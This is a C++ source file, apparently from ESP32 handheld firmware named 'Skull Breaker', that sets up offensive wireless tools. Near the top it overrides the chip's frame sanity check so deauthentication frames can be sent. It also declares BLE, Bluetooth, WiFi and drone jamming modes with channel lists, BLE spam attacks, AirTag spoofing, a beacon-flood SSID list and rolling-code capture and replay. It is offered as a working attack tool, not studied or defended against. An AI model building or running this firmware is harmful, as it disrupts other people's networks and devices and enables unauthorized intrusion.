#include <Arduino.h>
#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ILI9341.h>
#include <LittleFS.h>
#include <SD.h>
#include <Preferences.h>
#include <RF24.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Update.h>
#include <esp_wifi.h>
#include <esp_heap_caps.h>
#include <esp_task_wdt.h>
#include <NimBLEDevice.h>
#include <NimBLEBeacon.h>
#include <NimBLEServer.h>
#include <NimBLEService.h>
#include <NimBLEHIDDevice.h>
#include <time.h>
#include <sys/time.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

#include "app_state.h"
#include "scan_cleanup.h"
#include "system_types.h"
#include "system.h"
#include "storage.h"
#include "ui.h"
#include "companion_bridge.h"
#include "ble.h"
#include "wifi_module.h"
#include "rf.h"
#include "../rf/keeloq.h"

#include "esp_bt.h"
#include "esp_bt_main.h"
#define LOG_SCOPE "SYS"
#include "logging.h"
#include "orion_tools.h"

// ===== DEAUTH BYPASS =====
// Override ESP32 firmware sanity check to allow deauth frames
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

void drawListScrollArrows(int totalItems, int visibleItems, int scrollOffset);
bool ensureBLEInfoBatteryServices();
bool isGenericBLEName(const char* name);
void setBLEFocusedDevice(int index);
int findBLEDeviceByMAC(const String& mac);
void setBLELoggerTargetByIndex(int index);
void resetBLELoggerBuffer();
uint16_t dimColor565(uint16_t color, uint8_t divisor);
int getSelected24GHzIndex();
uint16_t getWaterfallPaletteColor(uint8_t strength);
bool probeCC1101Chip(bool configureAfter = true);
bool ensureCC1101Ready();
bool prepareCC1101PassiveTool(float tuneMHz = -1.0f, bool forceReconfigure = false);
bool prepareCC1101ActiveTool(const char* contextLabel, bool forceReconfigure = false);
int cc1101ReadRSSI();
void cc1101SetFrequencyMHz(float mhz);
float cc1101ApplyFrequencyCorrection(float mhz);
void cc1101ConfigureBase();
bool cc1101TransmitBurstPacket(const uint8_t* payload, size_t len);
void cc1101WriteReg(uint8_t reg, uint8_t value);
void cc1101WriteBurst(uint8_t reg, const uint8_t* data, size_t len);
void cc1101ReadBurstStatus(uint8_t reg, uint8_t* buf, uint8_t len);
uint8_t cc1101ReadReg(uint8_t reg);
uint8_t cc1101Strobe(uint8_t command);
float getCurrentRFBandStart();
float getCurrentRFBandEnd();
void resetRFSweepLevels();
void resetRFMonitorHistory();
void refreshDiagnosticsStatus();
bool wipeSDDirectory(const String& path);
bool loadSubFileForTransmit(const String& path);
bool transmitLoadedSubFile();
void wifi_sniffer_extended(void* buf, wifi_promiscuous_pkt_type_t type);
void cc1101EnterRx();
void clearLoadedSubFile();
bool ensureRFSubBuffer();
void initializeSystemClockFromBuild();
void markCurrentScreenForRedraw();
void restoreDisplayAfterStorageAccess();
void restoreDisplayAfterHeavyStorageAccess();
void serviceSDCardState();
bool serviceScreenSaver();
String getScreenSaverTimeoutLabel();
const char* getScreenSaverStyleLabel();
void persistScreenSaverSettings();
void serviceBatteryMonitor();
bool startWirelessUpdate();
void stopWirelessUpdate();
void serviceWirelessUpdateScreen();
void playProjectBrandSplash();
bool drawBootSplashImage(const char* path, int imageW, int imageH, int x, int y);
void prewarmBLEStack();
void resetBLEAnalyzerHistory();
void pushBLEAnalyzerSample(int sampleCount);
void drawBLEAnalyzer();
void setRFBandForFrequency(float mhz);
void stopCCTool();
void stopRFTransmitNow();
void runRFScanner();
void runRFMonitor();
void runRFJammer();
void runRFSignalCapture();
void runRFSweep();
void runRFTransmit();
void runRollingCapture();
void runHiddenSSIDReveal();
void runAirTagSpoof();
bool initBLEForAttacks();
bool bleReinitWithRandomMac();  // defined in ble_attacks.cpp
void bleSendRawAdv(const uint8_t* data, size_t len, uint32_t dwellMs);
void beginRFSignalCaptureRecording();
bool finalizeRFSignalCaptureRecording();
void resetRFSignalCaptureRecording();
void cc1101SetFrequencyMHzQuick(float mhz);
void renderRFSweepSpectrum(bool fullRedraw);
void pushRFSweepWaterfallRow();
bool saveRFSignalCaptureToSD();
void initializeDisplaySafe();
void delayMicrosecondsLong(unsigned long durationUs);
bool startRFContinuousCarrier();
void releaseIconCacheMemory();
void drawScreenSaverFrame(uint8_t styleIndex, bool resetFrame);
void drawWirelessUpdateScreen();
void drawStorageSettingsScreen();
void handleFileManagerInput();
void handleSDFormatConfirmInput();
bool deleteSDEntryInternal(const String& path);
void handleFileDetailInput();
void handleFileDeleteConfirmInput();
void beginFileRename(const String& path);
void handleFileRenameInput();
void primeSharedSPIBus();
void beginSPIOperation(bool suspendDisplay);
void endSPIOperation(bool restoreDisplay, bool heavyRestore);
void clearBLEScanResults();
void clearWiFiScanResults();
void resetAllToolAndUIState(bool clearLists);
void navigateBack();
void navigateToSettings();
String classifyWiFiInfrastructure(const String& ssid, const String& bssid);
void storeBLEDeviceResult(const String& name, const String& mac, int rssi, int &count,
                          uint16_t companyId, uint16_t detectFlags,
                          const String& hint, uint16_t primaryId);
void storeWiFiNetworkResult(const String& ssid, const String& bssid, int channel, int rssi, const String& enc, int& count);
static void formatWiFiListBSSID(const char* bssid, char* out, size_t outSize);
void sortWiFiResultsByRSSI();
void pruneBLEScanResults(unsigned long maxAgeMs);
void saveBLESavedMacSnapshot();
void bleSessionOpen();
void bleSessionClose();
String getBLECompanyName(uint16_t companyId);
void resetBLEPeripheralState();
void resetBLEScanEngine();
void stopBLEBeaconSpammer();
bool ensureFlockWiFiSniffer(bool resetHop = false);
void serviceFlockWiFiSniffer(bool resetHop = false);
void stopFlockWiFiSniffer();
void drainFlockWiFiAlerts();
void stopBLEStableDevice();
void stopBLEBeaconTest();
void stop24GHzActiveMode();
void shutdownWiFiStack(bool clearResults);

// BLE Attack Functions
void runSourApple();
void runSwiftPairSpam();
void runSamsungSpam();
void runBLEBeaconSpam();
void runBTSpamAll();
void runBLEJammer();
void runBLESpoofer();

TaskHandle_t wifiTaskHandle = NULL;
TaskHandle_t bleScanTaskHandle = NULL;
extern int wifiSnifferHopChannel;
extern unsigned long wifiSnifferLastHop;

#define PM_WIDTH 240
#define PM_HEIGHT 120

bool radioLocked = false;
unsigned long radioModeTransitionUntil = 0;
const int MAX_SCAN_RESULTS = 20; // Shared BLE + WiFi device list cap
const unsigned long DEVICE_STALE_MS = 15000UL;
const unsigned long BUTTON_DEBOUNCE_MS = 150UL;
const unsigned long FILE_MANAGER_DETAIL_HOLD_MS = 3000UL;
String g_fileDetailToast;
unsigned long g_fileDetailToastUntil = 0;

// Universal toast — shown at bottom of any tool screen for 2s
String g_toast;
unsigned long g_toastUntil = 0;

bool shouldRedraw = true;
bool toolBlockedScreenActive = false;
uint8_t toolBlockedMode = 0;
uint8_t toolBlockedReasonCode = 0;
bool displayUpdatesSuspended = false;
uint8_t spiOperationDepth = 0;
unsigned long bleLastSeen[MAX_SCAN_RESULTS] = {0};

static inline bool radioModeTransitionActive(unsigned long now = 0) {
    if (now == 0) {
        now = millis();
    }
    return radioModeTransitionUntil != 0 && now < radioModeTransitionUntil;
}

static inline void rfDiagLog(const String& message) {
    LOG_IF(DEBUG_VERBOSE_RF, String("[RF] ") + message);
}

// BLE session CSV — one file per BLE scanner session, rewritten with current results
static String  bleSessionPath      = "";
static bool    bleSessionActive    = false;
unsigned long wifiLastSeen[MAX_SCAN_RESULTS] = {0};

// ===== BLE STATE =====
int bleDeviceCount = 0;

char bleNames[MAX_SCAN_RESULTS][32];
char bleMACs[MAX_SCAN_RESULTS][18];
int bleRSSI[MAX_SCAN_RESULTS];
uint16_t bleCompanyIds[MAX_SCAN_RESULTS];
uint16_t bleDetectFlags[MAX_SCAN_RESULTS];
uint16_t blePrimaryIds[MAX_SCAN_RESULTS];
char bleHints[MAX_SCAN_RESULTS][24];

bool bleScanRunning = false;
volatile bool bleScanCancelRequested = false;
volatile bool bleScanWorkerActive = false;
unsigned long bleScanStartedAt = 0;
unsigned long bleScanReadyAt = 0;
bool bleScanAutoRetryPending = false;
uint8_t bleScanWarmupRetries = 0;
bool bleScannerFirstDraw = true;
bool bleNeedsRedraw = true;
bool blePreserveResultsOnNextScan = false;
unsigned long bleContinuousScanAt = 0;
char bleScanStatus[32] = "Idle";
bool bleScanLastRunFailed = false;
uint8_t bleLastActiveCount = 0;
uint8_t bleLastPassiveCount = 0;
uint8_t bleLastFilteredCount = 0;
bool flockWiFiHybridArmed = false;
uint8_t flockWiFiHopIndex = 0;
unsigned long flockWiFiLastHopMs = 0;

int bleSelectedIndex = 0;
int bleScrollOffset = 0;

enum BluetoothSnifferProfile : uint8_t {
    BT_SNIFFER_ANALYZER = 0,
    BT_SNIFFER_GENERAL,
    BT_SNIFFER_CARD_SKIMMERS,
    BT_SNIFFER_FLIPPER,
    BT_SNIFFER_AIRTAG,
    BT_SNIFFER_FLOCK,
    BT_SNIFFER_META,
    BT_SNIFFER_MANUFACTURER
};

enum BLEDetectFlag : uint16_t {
    BLE_FLAG_NONE     = 0,
    BLE_FLAG_FLIPPER  = 1 << 0,
    BLE_FLAG_AIRTAG   = 1 << 1,
    BLE_FLAG_FLOCK    = 1 << 2,
    BLE_FLAG_META     = 1 << 3,
    BLE_FLAG_SKIMMER  = 1 << 4,
    BLE_FLAG_INFRA    = 1 << 5
};

BluetoothSnifferProfile bluetoothSnifferProfile = BT_SNIFFER_GENERAL;

// Sort mode: 0=Strongest RSSI, 1=Newest (last seen)
uint8_t bleSortMode = 0;
int8_t bluetoothManufacturerFilterIndex = 0;
const int BLE_ANALYZER_POINTS = 48;
int bleAnalyzerSamples[BLE_ANALYZER_POINTS] = {0};
uint8_t bleAnalyzerWriteIndex = 0;
uint8_t bleAnalyzerSampleCount = 0;
bool bleAnalyzerHeaderDrawn = false; // Track if static header is drawn
int bleLastObservedCount = -1;
unsigned long bleAnalyzerNextScanMs = 0;
unsigned long bleAnalyzerLastDrawMs = 0;

// Removed MouseJack/HID sniffer code to save RAM (~300 bytes)

int bleDetailIndex = -1;
bool bleDetailActive = false;
char bleFocusedName[32] = ""; // Converted from String to save ~24 bytes overhead
char bleFocusedMAC[18] = ""; // Converted from String to save ~24 bytes overhead
int bleFocusedRSSI = -100;

bool bleBeaconInitialized = false;
bool bleBeaconFirstDraw = true;
bool bleBeaconNeedsRedraw = true;

bool bleDeviceInitialized = false;
bool bleDeviceFirstDraw = true;
bool bleDeviceNeedsRedraw = true;

bool bleBeaconTestInitialized = false;
bool bleBeaconTestFirstDraw = true;
bool bleBeaconTestNeedsRedraw = true;

const int BLE_RADAR_MAX_DEVICES = 8;
const int BLE_LOGGER_POINTS = 80;

bool bleRadarFirstDraw = true;
bool bleRadarNeedsRedraw = true;
unsigned long bleRadarLastScanMs = 0;
uint16_t bleRadarUpdateIntervalMs = 500;
int bleRadarVisibleCount = 0;
String bleRadarKnownMACs[BLE_RADAR_MAX_DEVICES];  // keep as String — small array (8 entries)
float bleRadarSmoothedRSSI[BLE_RADAR_MAX_DEVICES];

bool bleLoggerFirstDraw = true;
bool bleLoggerNeedsRedraw = true;
unsigned long bleLoggerLastSampleMs = 0;
uint16_t bleLoggerSampleIntervalMs = 500;
int bleLoggerTargetIndex = 0;
String bleLoggerTargetName = "";
String bleLoggerTargetMAC = "";
int bleLoggerCurrentRSSI = -100;
int bleLoggerSamples[BLE_LOGGER_POINTS];
int bleLoggerWriteIndex = 0;
int bleLoggerSampleCount = 0;
unsigned long bleLoggerLastTargetPress = 0;
unsigned long bleRadarLastFocusPress = 0;
NimBLEScan* bleScanClient = nullptr;
bool bleScanClientConfigured = false;

unsigned long bleBeaconLastRotate = 0;
unsigned long bleBeaconLastFrame = 0;
unsigned long bleBeaconBursts = 0;
uint16_t bleBeaconRotateIntervalMs = 3000;
unsigned long bleDeviceLastRotate = 0;
uint16_t bleDeviceRotateIntervalMs = 500;

String bleBeaconStatus = "Idle";
String bleBeaconName = "";
String bleBeaconVendor = "";
String bleBeaconUUID = "";
String bleBeaconAddress = "";
uint16_t bleBeaconManufacturerId = 0;
uint16_t bleBeaconMajor = 0;
uint16_t bleBeaconMinor = 0;
unsigned long bleBeaconIdentityCount = 0;

String bleDeviceStatus = "Idle";
String bleDeviceAddrMode = "";
String bleDeviceName = "";
String bleDeviceVendor = "";
String bleDeviceUUID = "";
String bleDeviceAddress = "";
uint8_t bleDeviceBattery = 87;
unsigned long bleDeviceStartedAt = 0;
uint16_t bleDeviceManufacturerId = 0;

String bleBeaconTestStatus = "Idle";
String bleBeaconTestName = "";
String bleBeaconTestVendor = "";
String bleBeaconTestUUID = "";
String bleBeaconTestAddress = "";
String bleBeaconTestAddrMode = "";
uint16_t bleBeaconTestManufacturerId = 0;
uint16_t bleBeaconTestMajor = 0;
uint16_t bleBeaconTestMinor = 0;
unsigned long bleBeaconTestStartedAt = 0;
unsigned long bleBeaconTestRefreshCount = 0;

NimBLEAdvertising* bleBeaconAdvertising = nullptr;
NimBLEServer* bleBeaconServer = nullptr;
NimBLEHIDDevice* bleDeviceHid = nullptr;
NimBLEService* bleBeaconInfoService = nullptr;
NimBLEService* bleBeaconBatteryService = nullptr;
NimBLECharacteristic* bleBeaconModelCharacteristic = nullptr;
NimBLECharacteristic* bleBeaconVendorCharacteristic = nullptr;
NimBLECharacteristic* bleBeaconSerialCharacteristic = nullptr;
NimBLECharacteristic* bleBeaconBatteryCharacteristic = nullptr;
NimBLECharacteristic* bleDeviceInputReport = nullptr;
NimBLECharacteristic* bleDeviceOutputReport = nullptr;
NimBLECharacteristic* bleDeviceBootInput = nullptr;
NimBLECharacteristic* bleDeviceBootOutput = nullptr;

struct BLEBeaconProfile {
    const char* label;
    uint16_t manufacturerId;
};

const BLEBeaconProfile bleBeaconProfiles[] = {
    {"Apple", 0x004C},
    {"Microsoft", 0x0006},
    {"Samsung", 0x0075},
    {"Google", 0x00E0},
    {"Sony", 0x012D},
    {"Intel", 0x0002},
    {"Garmin", 0x0087},
    {"Fitbit", 0x00AD},
    {"Bose", 0x00F8},
    {"Tile", 0x013D}
};

const int bleBeaconProfileCount = sizeof(bleBeaconProfiles) / sizeof(bleBeaconProfiles[0]);

const char* bleBeaconNameStarts[] = {
    "Aster", "Halo", "Nova", "Slate", "Echo",
    "Drift", "Polar", "Pulse", "Orbit", "Vanta"
};

const char* bleBeaconNameEnds[] = {
    "Tag", "Node", "Link", "Point", "Loop",
    "Mini", "Hub", "Key", "Band", "Pod"
};

const int bleBeaconNameStartCount = sizeof(bleBeaconNameStarts) / sizeof(bleBeaconNameStarts[0]);
const int bleBeaconNameEndCount = sizeof(bleBeaconNameEnds) / sizeof(bleBeaconNameEnds[0]);

uint8_t bleKeyboardReportMap[] = {
    0x05, 0x01,
    0x09, 0x06,
    0xA1, 0x01,
    0x85, 0x01,
    0x05, 0x07,
    0x19, 0xE0,
    0x29, 0xE7,
    0x15, 0x00,
    0x25, 0x01,
    0x75, 0x01,
    0x95, 0x08,
    0x81, 0x02,
    0x95, 0x01,
    0x75, 0x08,
    0x81, 0x01,
    0x95, 0x05,
    0x75, 0x01,
    0x05, 0x08,
    0x19, 0x01,
    0x29, 0x05,
    0x91, 0x02,
    0x95, 0x01,
    0x75, 0x03,
    0x91, 0x01,
    0x95, 0x06,
    0x75, 0x08,
    0x15, 0x00,
    0x25, 0x65,
    0x05, 0x07,
    0x19, 0x00,
    0x29, 0x65,
    0x81, 0x00,
    0xC0
};

// ===== WIFI STATE =====
int wifiNetworkCount = 0;
char wifiSSIDs[MAX_SCAN_RESULTS][33];
int wifiRSSI[MAX_SCAN_RESULTS];

bool wifiScannerFirstDraw = true;
bool wifiPacketFirstDraw = true;

bool wifiScanRunning = false;
unsigned long wifiScanReadyAt = 0;
unsigned long wifiScanKeepStatusUntil = 0;
bool wifiScanAutoRetryPending = false;
uint8_t wifiScanWarmupRetries = 0;
char wifiScanStatus[32] = "Idle";
char wifiScanDebugLine[64] = "";
bool wifiScanLastRunFailed = false;

char wifiBSSID[MAX_SCAN_RESULTS][18];
char wifiEncStr[MAX_SCAN_RESULTS][8];
char wifiHints[MAX_SCAN_RESULTS][16];

int8_t wifiDetailIndex = -1;
bool wifiDetailActive = false;
bool wifiDetailSnapshotValid = false;
bool wifiDetailDrawn = false;  // reset when entering detail screen
char wifiDetailSnapshotSSID[33] = "";
char wifiDetailSnapshotBSSID[18] = "";
char wifiDetailSnapshotEnc[8] = "";
char wifiDetailSnapshotHint[16] = "";
int wifiDetailSnapshotRSSI = -100;
int wifiDetailSnapshotChannel = 0;

// ===== FILE MANAGER STATE =====
const int FILE_MANAGER_MAX_ENTRIES = 15; // Reduced from 20 to save ~240 bytes
String fileManagerEntries[FILE_MANAGER_MAX_ENTRIES];
bool fileManagerIsDir[FILE_MANAGER_MAX_ENTRIES];
uint32_t fileManagerSizes[FILE_MANAGER_MAX_ENTRIES];
String fileManagerFullPaths[FILE_MANAGER_MAX_ENTRIES];
bool fileManagerMarked[FILE_MANAGER_MAX_ENTRIES] = {false};
int fileManagerCount = 0;
int fileManagerSelectedIndex = 0;
int fileManagerScrollOffset = 0;
bool fileManagerNeedsRedraw = true;
String fileManagerPath = "/";
int fileManagerMarkedCount = 0;
bool fileManagerSelectMode = false;  // For HTML file selection
String fileManagerSelectFilter = "";  // Filter extension (e.g., ".html")
String fileDetailPath = "";
String fileDetailSavedText = "Unknown";
bool fileTextViewerActive = false;
String fileTextViewerContent = "";
int fileTextViewerScrollLine = 0;
int fileTextViewerLineCount = 0;
bool fileTextViewerTruncated = false;
String fileRenamePath = "";
String fileRenameDraft = "";
String fileRenameExtension = "";
String fileRenameStatus = "";
unsigned long fileRenameStatusUntil = 0;

// ===== EP RENAME STATE =====
String epRenameDraft = "";
int epRenameCursor = 0;
bool epRenameUppercase = false;
bool epRenameJustEntered = false; // Flag to reset prevCursor on entry
int fileRenameCursor = 0;
bool fileRenameUppercase = true;
bool selectReleaseRequired = false;
unsigned long fileManagerSelectHoldStart = 0;
int fileManagerSelectHoldIndex = -1;
bool fileManagerSelectHoldHandled = false;
unsigned long bleInitRetryAt = 0;
unsigned long wifiInitRetryAt = 0;

const int fileRenameKeyCols = 8;
const int fileRenameKeyCount = 48;
const char* fileRenameKeysUpper[fileRenameKeyCount] = {
    "A", "B", "C", "D", "E", "F", "G", "H",
    "I", "J", "K", "L", "M", "N", "O", "P",
    "Q", "R", "S", "T", "U", "V", "W", "X",
    "Y", "Z", "0", "1", "2", "3", "4", "5",
    "6", "7", "8", "9", "-", "_", "SP", "DEL",
    "BK", "OK", "aA", "", "", "", "", ""
};
const char* fileRenameKeysLower[fileRenameKeyCount] = {
    "a", "b", "c", "d", "e", "f", "g", "h",
    "i", "j", "k", "l", "m", "n", "o", "p",
    "q", "r", "s", "t", "u", "v", "w", "x",
    "y", "z", "0", "1", "2", "3", "4", "5",
    "6", "7", "8", "9", "-", "_", "SP", "DEL",
    "BK", "OK", "aA", "", "", "", "", ""
};
bool fileDeleteConfirmYes = false;
bool fileDeleteBatchMode = false;
String fileDeleteTargetPath = "";
int fileDeleteTargetCount = 0;
bool rfTransmitReturnToFileManager = false;
bool sdFormatConfirmEraseSelected = false;
unsigned long lastSDStateCheck = 0;
unsigned long toolScreenEnteredAt = 0;
unsigned long infoScreenEnteredAt = 0;  // For System Info and Storage Settings screens
bool storageInfoNeedsRedraw = true;
bool startupSequenceActive = true;
bool sdAutoMountRetryBlocked = false;
bool sdAutoMountErrorLatched = false;
bool sdBootAutoMountPending = false;

// Packet counter
volatile int packetCount = 0;

// ===== BEACON UI STATE =====
bool beaconFirstDraw = true;
uint8_t lastUIChannel = 255;
unsigned long lastUIUpdate = 0;
unsigned long beaconPackets = 0;
unsigned long lastPacketSnapshot = 0;
int beaconPPS = 0;

char lastSSID[32] = "";

// ===== ADD THIS AT TOP (AFTER INCLUDES) =====

// ===== Settings (FROM FIRST CODE) =====
const uint8_t channels[] = {1, 6, 11};
const bool wpa2 = true;
const bool appendSpaces = true;

const char ssids[] PROGMEM = {
  "Mom Use This One\n"
  "Abraham Linksys\n"
  "Benjamin FrankLAN\n"
  "Martin Router King\n"
  "John Wilkes Bluetooth\n"
  "Pretty Fly for a Wi-Fi\n"
  "Bill Wi the Science Fi\n"
  "I Believe Wi Can Fi\n"
  "Tell My Wi-Fi Love Her\n"
  "No More Mister Wi-Fi\n"
  "LAN Solo\n"
  "The LAN Before Time\n"
  "Silence of the LANs\n"
  "House LANister\n"
  "Winternet Is Coming\n"
  "Ping’s Landing\n"
  "The Ping in the North\n"
  "This LAN Is My LAN\n"
  "Get Off My LAN\n"
  "The Promised LAN\n"
  "The LAN Down Under\n"
  "FBI Surveillance Van 4\n"
  "Area 51 Test Site\n"
  "Drive-By Wi-Fi\n"
  "Planet Express\n"
  "Wu Tang LAN\n"
  "Darude LANstorm\n"
  "Never Gonna Give You Up\n"
  "Hide Yo Kids, Hide Yo Wi-Fi\n"
  "Loading…\n"
  "Searching…\n"
  "VIRUS.EXE\n"
  "Virus-Infected Wi-Fi\n"
  "Starbucks Wi-Fi\n"
  "Text ###-#### for Password\n"
  "Yell ____ for Password\n"
  "The Password Is 1234\n"
  "Free Public Wi-Fi\n"
  "No Free Wi-Fi Here\n"
  "Get Your Own Damn Wi-Fi\n"
  "It Hurts When IP\n"
  "Dora the Internet Explorer\n"
  "404 Wi-Fi Unavailable\n"
  "Porque-Fi\n"
  "Titanic Syncing\n"
  "Test Wi-Fi Please Ignore\n"
  "Drop It Like It’s Hotspot\n"
  "Life in the Fast LAN\n"
  "The Creep Next Door\n"
  "Ye Olde Internet\n"
};

// ===== GLOBALS FOR BEACON =====
char emptySSID[16];  // Reduced from 32 to save 16 bytes
uint8_t channelIndex = 0;
uint8_t macAddr[6];
uint8_t wifi_channel = 1;
uint32_t attackTime = 0;
uint32_t packetCounter = 0;

// ===== HELPERS =====
void nextChannel() {
  uint8_t ch = channels[channelIndex];
  channelIndex++;
  if (channelIndex >= sizeof(channels)) channelIndex = 0;

  if (ch != wifi_channel) {
    wifi_channel = ch;
    esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
  }
}

void randomMac() {
  for (int i = 0; i < 6; i++) {
    macAddr[i] = random(256);
  }
}

// ===== SD CARD =====
#define SD_CS 5

// ===== DISPLAY =====
#define TFT_CS    15
#define TFT_DC    2
#define TFT_RST   4


// ===== BUTTONS =====
#define BTN_UP     32
#define BTN_DOWN   33
#define BTN_LEFT   26
#define BTN_RIGHT  27
#define BTN_SELECT 25
// TFT: wire the module's single LED (or BL) control pin here for PWM backlight. -1 = not used / tied to 3.3 V.
#define TFT_BACKLIGHT_PIN 13
#define BATTERY_ADC_PIN 34
#define CHARGER_DETECT_PIN 35

// ===== OS =====
#define PROJECT_NAME "Skull Breaker"
#define PROJECT_VERSION "v1"
#define OS_VERSION PROJECT_VERSION

#define BOOT_LOG(x) orionLogLine("BOOT", String(x))
#define BOOT_LOG_KV(key, value) orionLogKV("BOOT", key, value)
#define BOOT_SECTION(title) orionLogSection("BOOT", title)
#define BOOT_LOGF(...) orionLogPrintf("BOOT", __VA_ARGS__)

ScreenState currentScreen = SCREEN_MAIN;

void drawSubMenu();

Adafruit_ILI9341 tft = Adafruit_ILI9341(TFT_CS, TFT_DC, TFT_RST);
Preferences prefs;

// ── Toast system ─────────────────────────────────────────────────────────────
void showToast(const char* msg, unsigned long durationMs = 2000UL) {
    g_toast = msg;
    g_toastUntil = millis() + durationMs;
}

void drawToastIfActive() {
    if (g_toastUntil == 0 || millis() > g_toastUntil) {
        if (g_toast.length() > 0) {
            tft.fillRect(8, 288, 224, 12, ILI9341_BLACK);
            g_toast = "";
        }
        return;
    }
    tft.fillRoundRect(8, 288, 224, 12, 3, tft.color565(40, 40, 40));
    tft.setTextSize(1);
    tft.setTextColor(ILI9341_WHITE);
    tft.setCursor(12, 290);
    char msg[31];
    strncpy(msg, g_toast.c_str(), 30);
    msg[30] = 0;
    tft.print(msg);
}

// Forward declarations for sort functions (defined later)
void sortBLEResultsByRSSI();
void sortBLEResultsByNewest();
void sortBLEResults();

// ===== STATUS =====
bool sdMounted = false;
bool sdDetected = false;
bool sdError = false;
bool flashFsReady = false;
uint8_t batteryPercent = 0;  // start at 0, let first real reading set it
bool chargerConnected = false;
uint16_t batteryRawFiltered = 0;
unsigned long batteryLastSampleMs = 0;
unsigned long chargerLastSampleMs = 0;
uint8_t batteryMonitorReady = 0;
uint8_t chargerDetectReady = 0;

static size_t readFileFully(File& file, uint8_t* buffer, size_t expectedBytes) {
    size_t totalRead = 0;
    while (totalRead < expectedBytes) {
        const size_t justRead = file.read(buffer + totalRead, expectedBytes - totalRead);
        if (justRead == 0) break;
        totalRead += justRead;
        yield();
    }
    return totalRead;
}
uint8_t chargerRawState = 0;
uint8_t chargerStableSamples = 0;

constexpr unsigned long BATTERY_START_DELAY_MS = 3000UL;
constexpr unsigned long BATTERY_SAMPLE_INTERVAL_MS = 2000UL;
constexpr unsigned long CHARGER_SAMPLE_INTERVAL_MS = 250UL;
constexpr uint8_t CHARGER_STABLE_CONFIRM_SAMPLES = 2;

// ===== ADC CALIBRATION =====
// Measured: 3.2V battery -> 0.345V at pin34
// Using ADC_0db (0-1.1V range) for accuracy at low voltages.
// 3.0V battery -> 0.323V -> raw ~1202
// 4.2V battery -> 0.453V -> raw ~1687
// These are estimates from the single measurement point — the BAT log will
// show actual raw values so you can tune BATTERY_EMPTY_RAW / BATTERY_FULL_RAW.
constexpr uint16_t BATTERY_EMPTY_RAW = 1200;  // ~3.0V (cutoff)
constexpr uint16_t BATTERY_FULL_RAW  = 1514;  // Adjusted: was showing 97% at full charge
constexpr int BATTERY_LOW_PERCENT = 10;
constexpr uint8_t BATTERY_PERCENT_HYSTERESIS = 2;
#if TFT_BACKLIGHT_PIN >= 0
constexpr uint8_t TFT_BACKLIGHT_LEDC_CH = 6;
static bool tftBacklightLedcReady = false;

static void applyTftBacklightDuty(uint8_t duty) {
    if (!tftBacklightLedcReady) {
        return;
    }
    ledcWrite(TFT_BACKLIGHT_LEDC_CH, duty);
}

static void initTftBacklightPwm() {
    ledcSetup(TFT_BACKLIGHT_LEDC_CH, 12000, 8);
    ledcAttachPin(TFT_BACKLIGHT_PIN, TFT_BACKLIGHT_LEDC_CH);
    tftBacklightLedcReady = true;
    ledcWrite(TFT_BACKLIGHT_LEDC_CH, 255);
}
#else
static void applyTftBacklightDuty(uint8_t) {}
static void initTftBacklightPwm() {}
#endif

struct IconCacheEntry {
    String path;
    int size = 0;
    uint16_t* pixels = nullptr;
    bool ownsPixels = false;
    bool pinned = false;
};

constexpr int ICON_CACHE_MAX = 40;
IconCacheEntry* iconCache = nullptr;
uint8_t iconCacheCount = 0;

// ===== PLACEHOLDER DIAGNOSTICS / RADIOS =====
bool diagnosticsOk = true;
bool radio1Ok = true;
bool radio2Ok = false;
bool cc1101Ok = false;
bool radio3Ok = false;
bool sdAutoMountWanted = false;
bool radio24ActivePrepared = false;

struct ToolGuardState {
    RadioMode mode = RADIO_IDLE;
    uint8_t failCount = 0;
    unsigned long blockedUntil = 0;
    char reason[12] = "";
};

ToolGuardState g_toolGuards[2];
unsigned long lastHeapTelemetryLogMs = 0;

uint32_t radio24ActiveTxCount = 0;
byte radio24ActiveChannel1 = 0;
byte radio24ActiveChannel2 = 0;
String radio24ActiveStatus = "Idle";
// ===== BLEJAMMER SINGLE RADIO STATE WITH FULL CHANNEL COVERAGE =====
enum OperationMode { DEACTIVE_MODE, BLE_MODULE, Bluetooth_MODULE, WIFI_MODULE, DRONE_MODULE, CONSTANT_CARRIER };
OperationMode jammerMode = DEACTIVE_MODE;

const byte ble_adv_channels[] = {37, 38, 39};
const byte ble_channels[] = {2, 26, 80};
const byte bluetooth_classic_channels[] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79};
const byte wifi_channels_full[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14};

volatile bool modeChangeRequested = false;
unsigned long lastJammingTime = 0;
const unsigned long jammingInterval = 12;
unsigned long radio24JamLastButtonPress = 0;
const unsigned long jamDebounceDelay = 500;

byte currentJamChannel = 0;
uint32_t jamPacketCount = 0;
bool jammerActive = false;
bool skipDisplayUpdate = false;  // CRITICAL: Pause display during RF24 TX to prevent SPI contention

// Constant carrier mode state
byte constantCarrierChannel = 45;
bool constantCarrierHopping = true;
unsigned long lastCarrierHop = 0;

String currentTitle = "";

// Helper function to get jammer mode label without storing it
const char* getJammerModeLabel() {
    switch (jammerMode) {
        case BLE_MODULE: return "BLE";
        case Bluetooth_MODULE: return "BT";
        case WIFI_MODULE: return "WiFi";
        case DRONE_MODULE: return "Drone";
        case CONSTANT_CARRIER: return "Carrier";
        default: return "Off";
    }
}

// ===== RADIO 3 (CC1101) =====
#define CC1101_CS   22
#define CC1101_GDO0 12   // Async serial data - GPIO 12 with 10k pull-down to GND

constexpr uint8_t CC1101_IOCFG2   = 0x00;
constexpr uint8_t CC1101_IOCFG1   = 0x01;
constexpr uint8_t CC1101_IOCFG0   = 0x02;
constexpr uint8_t CC1101_FIFOTHR  = 0x03;
constexpr uint8_t CC1101_PKTLEN   = 0x06;
constexpr uint8_t CC1101_PKTCTRL1 = 0x07;
constexpr uint8_t CC1101_PKTCTRL0 = 0x08;
constexpr uint8_t CC1101_FSCTRL1  = 0x0B;
